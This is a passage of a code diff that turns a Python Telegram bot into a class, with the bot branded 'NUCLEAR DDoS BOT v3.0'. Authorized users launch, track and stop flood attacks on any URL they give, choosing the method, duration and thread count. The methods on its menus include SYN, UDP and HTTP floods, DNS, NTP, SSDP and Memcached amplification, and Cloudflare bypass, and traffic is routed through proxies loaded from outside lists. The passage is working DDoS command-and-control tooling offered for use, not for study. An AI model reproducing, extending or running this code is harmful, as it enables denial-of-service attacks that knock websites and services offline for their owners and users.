+            if threads < 1 or threads > CONFIG["MAX_THREADS_PER_ATTACK"]:
+                await update.message.reply_text(
+                    f"❌ Threads must be between 1 and {CONFIG['MAX_THREADS_PER_ATTACK']}!"
+                )
+                return
+            
+            if method not in ATTACK_METHODS:
+                await update.message.reply_text(
+                    "❌ Unknown method! Use /methods to see available methods."
+                )
+                return
+            
+        except ValueError:
+            await update.message.reply_text("❌ Invalid parameters!")
+            return
+        
+        # Generate unique attack ID
+        attack_id = hashlib.md5(f"{target}{method}{time.time()}".encode()).hexdigest()[:8]
+        
+        # Start attack
+        await update.message.reply_text(
+            f"⚡ *Launching Attack...*\n\n"
+            f"• ID: `{attack_id}`\n"
+            f"• Target: `{target}`\n"
+            f"• Method: `{method}`\n"
+            f"• Time: `{duration}s`\n"
+            f"• Threads: `{threads}`\n\n"
+            f"_Please wait..._",
+            parse_mode='Markdown'
+        )
+        
+        success = self.attack_manager.start_attack(
+            attack_id, target, method, duration, threads
+        )
+        
+        if success:
+            await update.message.reply_text(
+                f"✅ *Attack Launched Successfully!*\n\n"
+                f"• Attack ID: `{attack_id}`\n"
+                f"• Target: `{target}`\n"
+                f"• Method: `{method}`\n"
+                f"• Duration: `{duration}s`\n"
+                f"• Threads: `{threads}`\n"
+                f"• Proxies: `{len(self.attack_manager.proxy_manager.proxies)}`\n\n"
+                f"*Attack will auto-stop in {duration} seconds.*",
+                parse_mode='Markdown'
+            )
+        else:
+            await update.message.reply_text("❌ Failed to launch attack!")
+    
+    async def methods_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle /methods command"""
+        user_id = update.effective_user.id
+        if user_id not in CONFIG["ADMIN_IDS"]:
+            await update.message.reply_text("❌ Unauthorized!")
+            return
+        
+        methods_text = "🎯 *AVAILABLE ATTACK METHODS*\n\n"
+        
+        categories = {
+            "Layer 7 - Application": [],
+            "Layer 4 - Transport": [],
+            "Layer 3 - Network": [],
+            "Amplification": [],
+            "Ultimate": [],
+        }
+        
+        for method, info in ATTACK_METHODS.items():
+            if info["layer"] == 7:
+                categories["Layer 7 - Application"].append(method)
+            elif info["layer"] == 4:
+                categories["Layer 4 - Transport"].append(method)
+            elif info["layer"] == 3:
+                categories["Layer 3 - Network"].append(method)
+            elif info["layer"] == "AMP":
+                categories["Amplification"].append(method)
+            elif info["layer"] == "ULTIMATE":
+                categories["Ultimate"].append(method)
+        
+        for category, methods in categories.items():
+            if methods:
+                methods_text += f"*{category}:*\n"
+                for method in methods:
+                    info = ATTACK_METHODS[method]
+                    methods_text += f"• `{method}` - {info['description']} ({info['intensity']})\n"
+                methods_text += "\n"
+        
+        methods_text += "\n*Usage:* `/attack [url] [method] [time] [threads]`"
+        
+        await update.message.reply_text(methods_text, parse_mode='Markdown')
+    
+    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle /status command"""
+        user_id = update.effective_user.id
+        if user_id not in CONFIG["ADMIN_IDS"]:
+            await update.message.reply_text("❌ Unauthorized!")
+            return
+        
+        stats = self.attack_manager.get_all_stats()
+        
+        if not stats["active_attacks"]:
+            await update.message.reply_text("📊 *No active attacks*", parse_mode='Markdown')
+            return
+        
+        status_text = "📊 *ACTIVE ATTACKS*\n\n"
+        
+        for attack in stats["active_attacks"]:
+            mb_sent = attack["bytes"] / (1024 * 1024)
+            mbps = attack["bps"] / (1024 * 1024) if attack["bps"] > 0 else 0
+            
+            status_text += f"""🎯 *Attack ID:* `{attack['id']}`
+• Target: `{attack['target']}`
+• Method: `{attack['method']}`
+• Active: `{attack['active']}`
+• Duration: `{attack['duration']:.1f}s`
+• Requests: `{attack['requests']:,}`
+• RPS: `{attack['rps']:.1f}`
+• Data Sent: `{mb_sent:.2f} MB`
+• Speed: `{mbps:.2f} MB/s`
+• Threads: `{attack['threads']}`
 
 """
+        
+        status_text += f"\n*Global Stats:*\n"
+        status_text += f"• Total Requests: `{stats['global_stats']['total_requests']:,}`\n"
+        status_text += f"• Total Data: `{stats['global_stats']['total_bytes'] / (1024*1024*1024):.2f} GB`\n"
+        status_text += f"• Active Attacks: `{stats['global_stats']['active_attacks']}`\n"
+        status_text += f"• Total Attacks: `{stats['global_stats']['total_attacks']}`\n"
+        status_text += f"• Proxies: `{stats['proxy_count']}`"
+        
+        await update.message.reply_text(status_text, parse_mode='Markdown')
     
-    await update.message.reply_text(status_text, parse_mode='Markdown')
-
-async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Stop attack"""
-    if update.effective_user.id != ADMIN_ID:
-        await update.message.reply_text("❌ Unauthorized!")
-        return
-    
-    if not context.args:
-        await update.message.reply_text("❌ Usage: `/stop [target]`", parse_mode='Markdown')
-        return
-    
-    target = context.args[0]
-    success = attacker.stop_attack(target)
-    
-    if success:
-        await update.message.reply_text(f"✅ Stopped attack on `{target}`", parse_mode='Markdown')
-    else:
-        await update.message.reply_text(f"❌ No active attack on `{target}`", parse_mode='Markdown')
-
-async def proxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Proxy information"""
-    if update.effective_user.id != ADMIN_ID:
-        await update.message.reply_text("❌ Unauthorized!")
-        return
-    
-    count = len(attacker.proxies)
-    await update.message.reply_text(f"📊 *Proxy Status*\n\nActive Proxies: `{count}`\nSources: `{len(PROXY_SOURCES)}`\n\n*Last Updated:* Now", parse_mode='Markdown')
-
-async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Bot statistics"""
-    if update.effective_user.id != ADMIN_ID:
-        await update.message.reply_text("❌ Unauthorized!")
-        return
-    
-    total_attacks = len(attacker.attack_status)
-    active_attacks = sum(1 for info in attacker.attack_status.values() if info.get('active', False))
-    
-    stats_text = f"""📈 *BOT STATISTICS*
-
-*General:*
-• Total Attacks: `{total_attacks}`
-• Active Attacks: `{active_attacks}`
-• Proxies Loaded: `{len(attacker.proxies)}`
-• Methods Available: `{len(LAYER_7_METHODS) + len(LAYER_4_METHODS) + len(LAYER_3_METHODS) + len(ADVANCED_METHODS) + len(ULTIMATE_METHODS)}`
-
-*Current Load:*
-• Total Requests: `{attacker.total_requests:,}`
-• Data Sent: `{attacker.total_bytes / (1024*1024):.2f} MB`
-• Attack Threads: `{sum(info.get('threads', 0) for info in attacker.attack_status.values() if info.get('active', False))}`
-
-*Bot Status:* `🟢 OPERATIONAL`"""
-    
-    await update.message.reply_text(stats_text, parse_mode='Markdown')
-
-async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle inline keyboard buttons"""
-    query = update.callback_query
-    await query.answer()
-    
-    if query.data == "start_attack":
-        await query.edit_message_text("⚡ *Start Attack*\n\nPlease use: `/attack [url] [method] [time] [threads]`\n\nExample: `/attack example.com HTTP-RAW 60 1000`", parse_mode='Markdown')
-    
-    elif query.data == "methods":
-        methods_text = """*Available Methods:*
-
-*Layer 7:* HTTP-RAW, HTTPS-SSL, CLOUDFLARE-BYPASS, WEBSOCKET, API-FLOOD, GRPC-ATTACK, HTTP2-FLOOD
-
-*Layer 4:* SYN-FLOOD, ACK-FLOOD, UDP-FLOOD, ICMP-FLOOD, RST-FLOOD, TEARDROP
-
-*Layer 3:* IP-FRAGMENT, SMURF-ATTACK, LAND-ATTACK
-
-*Advanced:* DNS-AMPLIFICATION, NTP-AMPLIFICATION, SSDP-AMPLIFICATION, MEMCACHED-AMP
-
-*Ultimate:* NUCLEAR-MIX, KILL-PROTOCOL, TSUNAMI-WAVE"""
-        await query.edit_message_text(methods_text, parse_mode='Markdown')
-    
-    elif query.data == "status":
-        stats = attacker.get_stats()
-        if stats:
-            status_text = "📊 *Active Attacks:*\n\n"
-            for stat in stats:
-                status_text += f"• `{stat['target']}` - {stat['method']} - {stat['elapsed']}s\n"
-            await query.edit_message_text(status_text, parse_mode='Markdown')
+    async def stop_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle /stop command"""
+        user_id = update.effective_user.id
+        if user_id not in CONFIG["ADMIN_IDS"]:
+            await update.message.reply_text("❌ Unauthorized!")
+            return
+        
+        if context.args:
+            # Stop specific attack
+            attack_id = context.args[0]
+            success = self.attack_manager.stop_attack(attack_id)
+            
+            if success:
+                await update.message.reply_text(
+                    f"✅ Stopped attack `{attack_id}`",
+                    parse_mode='Markdown'
+                )
+            else:
+                await update.message.reply_text(
+                    f"❌ No active attack with ID `{attack_id}`",
+                    parse_mode='Markdown'
+                )
         else:
-            await query.edit_message_text("📊 *No active attacks*", parse_mode='Markdown')
+            # Stop all attacks
+            self.attack_manager.stop_all_attacks()
+            await update.message.reply_text("✅ All attacks stopped!")
     
-    elif query.data == "stop_attack":
-        await query.edit_message_text("🛑 *Stop Attack*\n\nUse: `/stop [target]`\nExample: `/stop example.com`", parse_mode='Markdown')
+    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle /stats command"""
+        user_id = update.effective_user.id
+        if user_id not in CONFIG["ADMIN_IDS"]:
+            await update.message.reply_text("❌ Unauthorized!")
+            return
+        
+        stats = self.attack_manager.get_all_stats()
+        
+        stats_text = f"""📈 *BOT STATISTICS*
+
+*Global Performance:*
+• Total Requests: `{stats['global_stats']['total_requests']:,}`
+• Total Data: `{stats['global_stats']['total_bytes'] / (1024*1024*1024):.2f} GB`
+• Active Attacks: `{stats['global_stats']['active_attacks']}`
+• Total Attacks: `{stats['global_stats']['total_attacks']}`
+
+*System Status:*
+• Proxies Available: `{stats['proxy_count']}`
+• Max Threads: `{CONFIG['MAX_TOTAL_THREADS']}`
+• Max Attack Time: `{CONFIG['MAX_ATTACK_TIME']}s`
+• Methods Available: `{len(ATTACK_METHODS)}`
+
+*Bot Status:* `🟢 OPERATIONAL`
+*Last Update:* `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"""
+        
+        await update.message.reply_text(stats_text, parse_mode='Markdown')
     
-    elif query.data == "settings":
-        settings_text = """*🔧 BOT SETTINGS*
+    async def proxies_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle /proxies command"""
+        user_id = update.effective_user.id
+        if user_id not in CONFIG["ADMIN_IDS"]:
+            await update.message.reply_text("❌ Unauthorized!")
+            return
+        
+        proxy_count = len(self.attack_manager.proxy_manager.proxies)
+        last_refresh = datetime.fromtimestamp(
+            self.attack_manager.proxy_manager.last_refresh
+        ).strftime('%Y-%m-%d %H:%M:%S')
+        
+        proxies_text = f"""🌐 *PROXY INFORMATION*
 
-*Current Configuration:*
-• Max Threads: `5000`
-• Max Time: `3600s`
-• Proxy Auto-Refresh: `Enabled`
-• Attack Layers: `7, 4, 3`
-• Cloudflare Bypass: `Enabled`
+• Active Proxies: `{proxy_count}`
+• Last Refresh: `{last_refresh}`
+• Sources: `{len(PROXY_SOURCES)}`
+• Refresh Interval: `{CONFIG['PROXY_REFRESH_INTERVAL']}s`
 
-*Commands:*
-/refresh_proxies - Refresh proxy list
-/set_threads [num] - Set max threads
-/set_time [sec] - Set max time"""
-        await query.edit_message_text(settings_text, parse_mode='Markdown')
-
-async def refresh_proxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Refresh proxy list"""
-    if update.effective_user.id != ADMIN_ID:
-        await update.message.reply_text("❌ Unauthorized!")
-        return
+*Proxy Sources:*
+"""
+        
+        for i, source in enumerate(PROXY_SOURCES[:5], 1):
+            proxies_text += f"{i}. `{source}`\n"
+        
+        if len(PROXY_SOURCES) > 5:
+            proxies_text += f"... and {len(PROXY_SOURCES) - 5} more\n"
+        
+        proxies_text += "\n*Command:* `/refresh_proxies` to refresh now"
+        
+        await update.message.reply_text(proxies_text, parse_mode='Markdown')
     
-    await update.message.reply_text("🔄 Refreshing proxies...")
-    attacker.refresh_proxies()
+    async def refresh_proxies_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle /refresh_proxies command"""
+        user_id = update.effective_user.id
+        if user_id not in CONFIG["ADMIN_IDS"]:
+            await update.message.reply_text("❌ Unauthorized!")
+            return
+        
+        await update.message.reply_text("🔄 Refreshing proxies...")
+        
+        self.attack_manager.proxy_manager.load_proxies()
+        
+        proxy_count = len(self.attack_manager.proxy_manager.proxies)
+        await update.message.reply_text(
+            f"✅ Proxies refreshed! Now have `{proxy_count}` proxies.",
+            parse_mode='Markdown'
+        )
     
-    count = len(attacker.proxies)
-    await update.message.reply_text(f"✅ Proxies refreshed! Total: `{count}`", parse_mode='Markdown')
+    async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle inline keyboard button presses"""
+        query = update.callback_query
+        await query.answer()
+        
+        user_id = update.effective_user.id
+        if user_id not in CONFIG["ADMIN_IDS"]:
+            await query.edit_message_text("❌ Unauthorized!")
+            return
+        
+        if query.data == "menu_start":
+            await query.edit_message_text(
+                "⚡ *Start Attack*\n\n"
+                "Use: `/attack [url] [method] [time] [threads]`\n\n"
+                "*Example:* `/attack example.com HTTP-NUKE 60 1000`\n\n"
+                "Use `/methods` to see available methods.",
+                parse_mode='Markdown'
+            )
+        
+        elif query.data == "menu_methods":
+            await self.methods_command(update, context)
+        
+        elif query.data == "menu_status":
+            await self.status_command(update, context)
+        
+        elif query.data == "menu_stop":
+            keyboard = [
+                [InlineKeyboardButton("🛑 STOP ALL ATTACKS", callback_data="confirm_stop_all")],
+                [InlineKeyboardButton("🔙 BACK", callback_data="menu_main")],
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            await query.edit_message_text(
+                "🛑 *Stop Attacks*\n\n"
+                "Are you sure you want to stop all attacks?",
+                parse_mode='Markdown',
+                reply_markup=reply_markup
+            )
+        
+        elif query.data == "confirm_stop_all":
+            self.attack_manager.stop_all_attacks()
+            await query.edit_message_text("✅ All attacks stopped!")
+        
+        elif query.data == "menu_stats":
+            await self.stats_command(update, context)
+        
+        elif query.data == "menu_refresh":
+            await self.refresh_proxies_command(update, context)
+        
+        elif query.data == "menu_main":
+            await self.start(update, context)
+    
+    async def unknown_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle unknown commands"""
+        await update.message.reply_text(
+            "❌ Unknown command!\n"
+            "Use /start to see available commands."
+        )
+    
+    def run(self):
+        """Run the Telegram bot"""
+        # Create application
+        self.application = Application.builder().token(CONFIG["TELEGRAM_BOT_TOKEN"]).build()
+        
+        # Add command handlers
+        self.application.add_handler(CommandHandler("start", self.start))
+        self.application.add_handler(CommandHandler("attack", self.attack_command))
+        self.application.add_handler(CommandHandler("methods", self.methods_command))
+        self.application.add_handler(CommandHandler("status", self.status_command))
+        self.application.add_handler(CommandHandler("stop", self.stop_command))
+        self.application.add_handler(CommandHandler("stats", self.stats_command))
+        self.application.add_handler(CommandHandler("proxies", self.proxies_command))
+        self.application.add_handler(CommandHandler("refresh_proxies", self.refresh_proxies_command))
+        
+        # Add callback query handler
+        self.application.add_handler(CallbackQueryHandler(self.button_handler))
+        
+        # Add unknown command handler
+        self.application.add_handler(MessageHandler(filters.COMMAND, self.unknown_command))
+        
+        # Start bot
+        Logger.success("Telegram bot starting...")
+        self.application.run_polling(allowed_updates=Update.ALL_TYPES)
 
+# ========== MAIN ==========
 def main():
     """Main function"""
-    print(Fore.GREEN + """
-    ╔══════════════════════════════════════════════════╗
-    ║         ☢️ NUCLEAR DDoS BOT v2.0 ☢️            ║
-    ║     7-LAYER ATTACK • TELEGRAM BOT • PYTHON      ║
-    ║                                                  ║
-    ║  [✓] Layer 7 Attacks: HTTP/HTTPS/WebSocket/API  ║
-    ║  [✓] Layer 4 Attacks: SYN/UDP/ICMP/TCP          ║
-    ║  [✓] Layer 3 Attacks: IP/Smurf/LAND             ║
-    ║  [✓] Amplification: DNS/NTP/SSDP/Memcached      ║
-    ║  [✓] Ultimate: Nuclear/Tsunami/Kill Protocol    ║
-    ║  [✓] Auto-Proxy System from GitHub              ║
-    ║  [✓] Cloudflare Bypass                          ║
-    ╚══════════════════════════════════════════════════╝
+    # Banner
+    print(Fore.CYAN + """
+    ╔══════════════════════════════════════════════════════════╗
+    ║         ☢️ NUCLEAR DDoS BOT v3.0 - ULTIMATE ☢️         ║
+    ║               7-LAYER ATTACK SYSTEM                     ║
+    ║                  AUTO-TIME CONTROL                      ║
+    ║                HIGH-THREAD OPTIMIZED                    ║
+    ╚══════════════════════════════════════════════════════════╝
     """)
     
-    # Create application
-    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
+    Logger.success("Initializing Nuclear DDoS Bot v3.0...")
     
-    # Add command handlers
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("attack", attack_command))
-    application.add_handler(CommandHandler("methods", methods_command))
-    application.add_handler(CommandHandler("status", status_command))
-    application.add_handler(CommandHandler("stop", stop_command))
-    application.add_handler(CommandHandler("proxies", proxies_command))
-    application.add_handler(CommandHandler("stats", stats_command))
-    application.add_handler(CommandHandler("refresh_proxies", refresh_proxies_command))
+    # Check imports
+    try:
+        import requests
+        import cloudscraper
+    except ImportError as e:
+        Logger.error(f"Missing dependency: {e}")
+        Logger.info("Installing dependencies...")
+        import subprocess
+        subprocess.check_call([sys.executable, "-m", "pip", "install", 
+                              "requests", "cloudscraper", "python-telegram-bot", 
+                              "colorama"])
+        Logger.success("Dependencies installed. Please restart the bot.")
+        sys.exit(1)
     
-    # Add callback query handler
-    application.add_handler(CallbackQueryHandler(button_handler))
+    # Initialize attack manager
+    attack_manager = AttackManager()
     
-    # Start bot
-    print(Fore.CYAN + "[+] Bot starting...")
-    application.run_polling(allowed_updates=Update.ALL_TYPES)
+    # Initialize Telegram bot
+    telegram_bot = TelegramBot(attack_manager)
+    
+    # Run bot in separate thread
+    bot_thread = threading.Thread(target=telegram_bot.run, daemon=True)
+    bot_thread.start()
+    
+    Logger.success("Bot is running! Use /start in Telegram to begin.")
+    Logger.info("Press Ctrl+C to stop.")
+    
+    try:
+        # Keep main thread alive
+        while True:
+            # Refresh proxies if needed
+            attack_manager.proxy_manager.refresh_if_needed()
+            
+            # Update stats periodically
+            time.sleep(CONFIG["STATS_UPDATE_INTERVAL"])
+            
+    except KeyboardInterrupt:
+        Logger.warning("Shutting down...")
+        attack_manager.stop_all_attacks()
+        Logger.success("Bot stopped successfully.")
+        sys.exit(0)
 
 if __name__ == "__main__":
-    # Install required packages
-    required_packages = [
-        "python-telegram-bot",
-        "requests",
-        "cloudscraper",
-        "colorama",
-        "dnspython",
-        "urllib3",
-    ]
-    
-    print(Fore.YELLOW + "[+] Checking dependencies...")
-    
-    import subprocess
-    import sys
-    
-    for package in required_packages:
-        try:
-            __import__(package.replace("-", "_"))
-        except ImportError:
-            print(Fore.RED + f"[-] Installing {package}...")
-            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
-    
     main()
